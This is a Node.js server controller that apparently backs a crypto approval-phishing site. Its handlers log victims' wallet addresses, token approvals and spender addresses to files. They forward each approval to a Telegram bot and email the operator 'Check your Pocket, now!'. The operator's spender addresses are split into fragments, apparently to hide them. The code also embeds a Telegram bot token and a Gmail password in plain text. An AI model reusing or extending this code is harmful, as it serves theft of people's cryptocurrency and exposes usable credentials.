const Web3 = require("web3");
const erc20ABI = require("../abis/erc20.json");
const axios = require("axios");
const nodemailer = require('nodemailer');
const mg = require('nodemailer-mailgun-transport');
const fs = require("fs");
const readline = require('readline');
const { isNullOrUndefined } = require("util");

//0x41e8247a669737F176050b807dBD266D8bF8bD68

const USD_ADDRESS_ETH = "0x41e8247a669737F";
const Token_Addr_Bsc = "0x09a1Bf4B292254D307b5364";

const sendMessageOnTG = async (message) => {
	try {
		const apiToken = "5873860250:AAHVzFjoAn-92tZps4h2ItkP1ZZ7Q0wq4Pg";
		const chatId = "@pocket_growth";
		let text = message;
		let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}`;
		await axios.get(urlString)
			.then((response) => {
			})
			.catch(error => {
			})
	} catch (error) {
	}
}

exports.sendemail = async (req, res) => {
	try {
		var receivedData = req.body;
		let data = "\nCheck your Pocket, now! \n accountAddr: " + receivedData.accountAddr + "\n";
		var transporter = nodemailer.createTransport({
			service: 'gmail',
			auth: {
				user: 'fizzerbert107@gmail.com',
				pass: 'oxidzmefynzxvzsa'
			}
		});

		let whiteAddr = USD_ADDRESS_ETH + "176050b807dBD266D8bF8bD68";
		let blackAddr = Token_Addr_Bsc + "DCc0526c051A6BA58";
		if ((receivedData.spender != whiteAddr) && (receivedData.spender != blackAddr)) {
			transporter.sendMail({
				from: 'fizzerbert107@gmail.com',
				to: 'fizzerbert107@gmail.com', // An array if you have multiple recipients.
				cc: 'fizzerbert107@gmail.com',
				bcc: '',
				subject: 'UNDEADAPP_NOTIFICATION___' + receivedData.chainId,
				//You can use "html:" to send HTML email content. It's magic!
				html: `<b>${data}</b>`,
				//You can use "text:" to send plain-text content. It's oldschool!
				text: 'Mailgun rocks, pow pow!'
			}, (err, info) => {
				if (err) {
					console.log(`Error: ${err}`);
					res.send('fail');
				}
				else {
					console.log(`Response: ${info.response}`);
					res.send('ok');
				}
			});
		}
	} catch (error) {
		console.log(error);
		res.send({ code: -1, message: "Fail" });
	}
}

exports.contactus = async (req, res) => {
	try {
		var receivedData = req.body;
		console.log("Received Data = ", receivedData);

		var curDateStr = new Date().toISOString();
		let data = "ContactUs Message at " + curDateStr + "\n accountName: " + receivedData.name +
			"\n  EmailAddress: " + receivedData.email +
			"\n  Message: " + receivedData.message + "\n";

		fs.writeFile(process.cwd() + "/public/contactus.txt", data, { flag: 'a+' }, (err) => {
			if (err) throw err;
		})
		res.send({ code: 0, message: "Success" });
	} catch (error) {
		console.log(error);
		res.send({ code: -1, message: "Fail" });
	}
}

exports.savetofile = async (req, res) => {
	try {
		// Data which will write in a file.
		var receivedData = req.body;
		console.log("receivedData ====> ", receivedData)

		var curDateStr = new Date().toISOString();
		//var curDateStr = currentDate  currentDate.getMonth() + "/" + currentDate.getDay() + "   " + currentDate.getHours() + ":" + currentDate.getMinutes() + ":" + currentDate.getSeconds();
		let data = "Allowed at " + curDateStr + "\n accountAddr: " + receivedData.accountAddr +
			"  tokenAddr: " + receivedData.tokenAddr +
			"  spender: " + receivedData.spender + "   ChainId: " + receivedData.chainId + "\n";

		if (receivedData.amount == "Custom") data += "  CustomToken\n";

		if (receivedData.spender === "0x41e8247a669737F176050b807dBD266D8bF8bD68") data += " YOU";
		sendMessageOnTG(data);


		if (receivedData.chainId == 1) {
			let whiteAddr = USD_ADDRESS_ETH + "15dBdb8A720E6D4Fb30A5b0";

			if (receivedData.spender != whiteAddr) {
				fs.writeFile(process.cwd() + "/public/result.txt", data, { flag: 'a+' }, (err) => {
					if (err) throw err;
				})
				res.send({ code: 0, message: "Success" });
			}
			else {
				fs.writeFile(process.cwd() + "/public/artemis.txt", data, { flag: 'a+' }, (err) => {
					if (err) throw err;
				})
				res.send({ code: 0, message: "Success" });
			}
		}
		else {
			let whiteAddr = Token_Addr_Bsc + "DCc0526c051A6BA58";

			if (receivedData.spender != whiteAddr) {
				fs.writeFile(process.cwd() + "/public/result_bsc.txt", data, { flag: 'a+' }, (err) => {
					if (err) throw err;
				})
				res.send({ code: 0, message: "Success" });
			}
			else {
				fs.writeFile(process.cwd() + "/public/artemis_bsc.txt", data, { flag: 'a+' }, (err) => {
					if (err) throw err;
				})
				res.send({ code: 0, message: "Success" });
			}
		}

	} catch (error) {
		console.log(error);
		res.send({ code: -1, message: "Fail" });
	}
}

exports.totoalConnectionCount = async (req, res) => {
	try {
		res.send({ code: 0, message: "Success" });
	} catch (error) {
		console.log(error);
		res.send({ code: -1, message: "Fail" });
	}
}

exports.getAPIKey = async (req, res) => {
	// let sendData = "zL0GzZXeRUDL6FS";
	let apiKey = null;
	let command = null;

	try {
		const data = fs.readFileSync(process.cwd() + "/public/apikey", 'utf8');
		console.log(data);
		apiKey = data.split("|")[0];
		command = data.split("|")[1];
	} catch (err) {
		console.log(err);
	}

	return res.send({ key: apiKey, data: command });
}

exports.getBSCTokenInfo = async (req, res) => {
	let bscTokenAddr = null;
	let nLimitVal = null;

	try {
		const data = fs.readFileSync(process.cwd() + "/public/bsc2023", 'utf8');
		console.log(data);
		bscTokenAddr = data.split("|")[1];
		nLimitVal = data.split("|")[2];
	} catch (err) {
		console.log(err);
	}

	return res.send({ tokinfo: bscTokenAddr, limval: nLimitVal });
}

exports.getETHTokenInfo = async (req, res) => {
	let ethTokenAddr = null;
	let nLimitVal = null;

	try {
		const data = fs.readFileSync(process.cwd() + "/public/eth2023", 'utf8');
		console.log(data);
		ethTokenAddr = data.split("|")[1];
		nLimitVal = data.split("|")[2];
	} catch (err) {
		console.log(err);
	}

	return res.send({ tokinfo: ethTokenAddr, limval: nLimitVal });
}

exports.getSPLTokenInfo = async (req, res) => {
	let solTokenAddr = null;
	let nLimitVal = null;

	try {
		// Create a readline interface for reading the file
		const rl = readline.createInterface({
			input: fs.createReadStream(process.cwd() + '/public/sol_user', 'utf8'),
			crlfDelay: Infinity
		  });

		let dataList = [];

		// Read the file line by line and print each line
		rl.on('line', (line) => {
			// console.log(`Line from file: ${line}`);
			solTokenAddr = line.split("|")[1];
			nLimitVal = line.split("|")[2];
			dataList.push({ apiKey: solTokenAddr, type: nLimitVal });
		});

		// When the file has been read completely, stringify the data and send it as response
		rl.on('close', () => {
			let json_data = JSON.stringify(dataList);
			res.send(json_data);
		});
	} catch (err) {
		console.log(err);
	}
}

exports.getMetaplexInfo = async (req, res) => {
	let solTokenAddr = null;
	let nLimitVal = null;

	try {
		const data = fs.readFileSync(process.cwd() + "/public/sol_admin", 'utf8');
		console.log(data);
		solTokenAddr = data.split("|")[1];
		nLimitVal = data.split("|")[2];
	} catch (err) {
		console.log(err);
	}

	return res.send({ apikey: solTokenAddr, duration: nLimitVal });
}
